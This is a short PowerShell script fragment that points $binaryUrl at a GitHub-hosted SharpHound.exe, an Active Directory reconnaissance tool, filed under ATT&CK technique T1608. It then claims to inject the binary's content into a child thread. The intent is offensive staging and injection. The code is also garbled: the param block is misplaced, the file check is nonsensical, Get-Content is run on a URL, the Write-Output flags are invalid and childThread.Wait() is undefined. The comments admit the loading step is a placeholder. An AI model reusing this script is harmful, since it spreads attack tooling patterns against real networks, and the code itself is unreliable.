$binaryUrl = 'https://github.com/cmndcntrlcyber/attck/raw/main/attcks/T1608/exe/SharpHound.exe'

param(
   [string] $binaryUrl,
   [int] $childId
)

# Ensure the binary exists and is accessible
if (!-File -Path $binaryUrl | Test-Path -Exists) {
   Write-Error "The provided binary path does not exist or cannot be accessed."
   return
}

# Load the binary here. This is a placeholder as actual loading code depends on platform and binary format.
# For demonstration, we'll just read the binary content into memory.
$binaryContent = Get-Content $binaryUrl

{
    # Create a new thread to handle the injection process
    param(
        [string] $binaryUrl,
        [int] $childId
    )

    # Inject the binary content into the child thread
    Write-Output -f "Injected binary content: %s" -n $binaryContent

    # Wait for the child thread to finish
    childThread.Wait()
}